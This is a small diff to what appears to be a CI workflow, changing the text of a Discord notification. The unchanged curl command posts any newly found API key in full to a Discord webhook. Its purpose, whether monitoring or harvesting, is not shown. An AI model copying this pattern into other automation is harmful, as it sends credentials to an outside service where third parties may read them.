@@ -223,6 +223,6 @@ jobs:
           fi
 
           if [[ "$NEWAPI" -gt 0 ]]; then
-            whdata="{\"content\":\"New API Key Found!\n$NEWAPIKEY\"}"
+            whdata="{\"content\":\"New API Key Found! \n$NEWAPIKEY\"}"
             curl -s -X POST -o /dev/null -F "payload_json=${whdata}" "$DISCORD_WH" 2>&1 | grep -iv 'https://discord.com/api/webhooks/'
           fi
